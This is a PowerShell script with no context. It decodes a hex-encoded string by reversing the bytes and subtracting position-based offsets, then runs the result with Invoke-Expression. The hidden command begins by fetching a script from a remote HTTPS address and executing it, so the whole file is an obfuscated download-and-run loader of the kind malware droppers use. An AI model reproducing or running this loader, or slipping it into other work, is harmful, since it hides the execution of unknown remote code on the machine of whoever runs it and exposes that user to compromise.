$hex = '978EA5C496BCAF7E6A809C6B91756D7469243A632828193315261B2100D806EFCFC8BDF2D7D6A3D1C6B8BAA4AD609A9A90467979632A595B4F4B4640F83B2B17E1D702FE09BAB3B7E9DFDCD5C27A6CB2B0A058499A807D'
$step1 = $hex -split '(..)' -ne ''
[array]::Reverse($step1)
$bytes = $step1 | ForEach-Object { [Convert]::ToByte($_, 16) }
$originalCommand = -join (0..($bytes.Count-1) | ForEach-Object {
    $i = $_
    $offset = (($i + 1) * 7) + 13
    $val = $bytes[$i] - $offset
    while ($val -lt 0) { $val += 256 }
    [char]$val
})
Invoke-Expression $originalCommand
